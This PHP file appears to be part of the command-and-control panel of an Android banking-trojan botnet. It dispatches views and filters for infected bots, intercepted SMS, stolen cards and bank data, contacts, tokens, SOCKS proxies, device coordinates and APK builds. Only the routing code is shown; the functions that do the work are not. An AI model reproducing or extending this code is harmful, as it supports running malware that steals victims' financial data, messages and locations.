<?php
require_once("../dbget.php");
define ('VIEW_LIST_ROWS', 30);

function wrap_content ($content)
{
    //return '<div class="container">'.$content.'</div>';
    return $content;
}

function get_content ($view, $filter)
{
    $result = $view;
    if(!isset($filter['botid']))
		$filter['botid'] = '';
    if(!isset($filter['number']))
		$filter['number'] = '';
    if(!isset($filter['text']))
		$filter['text'] = '';
    if(!isset($filter['api']))
		$filter['api'] = '';

    db_connect();
    
    if ($view == 'news')
    {
        $result = get_news_view();
    }
    else if ($view == 'statistics')
    {
        $result = get_statistics_view();
    }
    else if ($view == 'statistics_guest')
    {
        $result = get_statistics_view_guest($filter);
    }
    else if ($view == 'bots')
    {
        $result = get_bots_view ($filter);
    }
    else if ($view == 'sms')
    {
        $result = get_sms_view ($filter['botid'], $filter);
    }
    else if ($view == 'sms-incoming')
    {
        $result = get_sms_incoming_view ($filter['botid'], $filter);
    }
    else if ($view == 'cards')
    {
        $result = get_cards_view ($filter);
    }
    else if ($view == 'banks')
    {
        $result = get_banks_view ($filter);
    }
    else if ($view == 'banks2')
    {
        $result = get_banks2_view ($filter['botid']);
    }
    else if ($view == 'botinfo')
    {
        $result = get_botinfo_view ($filter['botid']);
    }
    else if ($view == 'apps')
    {
        $result = get_apps_view ($filter);
    }
    
    else if ($view == 'settings')
    {
        $result = get_settings_view ($filter);
    }

    else if ($view == 'apks')
    {
        $result = get_apks_view ($filter);
    }

    else if ($view == 'docs')
    {
        $result = get_docs_view ($filter);
    }

    else if ($view == 'contacts')
    {
        $result = get_contacts_view($filter);
    }

    else if ($view == 'socks')
    {
        $result = get_socks_view($filter);
    }
    
    else if ($view == 'tokens')
    {
        $result = get_tokens_view($filter);
    }

    else if ($view == 'coordinates')
    {
        $result = get_coord_view($filter);
    }
    

    db_free();
    
    return wrap_content($result);
}

function get_filter ($view, $filter)
{
    $result = "";
    if(!isset($filter['botid']))
		$filter['botid'] = '';
    if(!isset($filter['number']))
		$filter['number'] = '';
    if(!isset($filter['text']))
		$filter['text'] = '';

    if ($view == 'bots')
    {
        $result = get_bots_filter ($filter);
    }
    else if ($view == 'sms')
    {
        $result = get_sms_filter ($filter['botid'], $filter);
    }
    else if ($view == 'sms-incoming')
    {
        $result = get_sms_incoming_filter ($filter['botid'], $filter);
    }
    else if ($view == 'cards')
    {
        $result = get_cards_filter ($filter);
    }
    else if ($view == 'banks')
    {
        $result = get_banks_filter ($filter);
    }
    else if ($view == 'banks2')
    {
        $result = get_banks2_filter ($filter['botid']);
    }
    else if ($view == 'apps')
    {
        $result = get_apps_filter($filter);
    }
    
    else if ($view == 'contacts')
    {
        $result = get_contacts_filter($filter);
    }

    else if ($view == 'socks')
    {
        $result = get_socks_filter($filter);
    }
    
    else if ($view == 'tokens')
    {
        $result = get_tokens_filter($filter);
    }

    else if ($view == 'coordinates')
    {
        $result = get_coord_filter($filter);
    }

    
    return wrap_content($result);
}

?>
